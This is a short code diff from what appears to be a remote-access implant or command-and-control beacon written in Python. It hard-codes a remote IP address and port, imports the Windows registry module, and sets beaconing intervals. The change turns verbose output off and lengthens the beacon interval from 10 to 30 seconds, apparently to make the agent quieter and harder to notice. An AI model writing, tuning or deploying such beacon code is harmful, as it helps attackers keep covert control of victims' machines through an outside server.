@@ -13,13 +13,13 @@ winreg_exists = importlib.find_loader('winreg')
 if winreg_exists:
     import winreg
 
-UUID = "ea4iFScQxHoScYMnztWhFyhVNOe5oZgeT"
+UUID = "ea4iFScQxHoSYMnztWhFyhVNOe5oZgeT"
 remote_ip = '134.209.206.142'
 remote_port = 8081
 server_sni_hostname = ''
-VERBOSE = True
+VERBOSE = False
 DEVNULL = subprocess.DEVNULL
-BEACON_INTERVAL_DEFAULT = 10    #in seconds
+BEACON_INTERVAL_DEFAULT = 30    #in seconds
 BEACON_INTERVAL_MEM = None
 BEACON_INTERVAL_HDD = None
 BEACON_INTERVAL_SETTING = BEACON_INTERVAL_DEFAULT
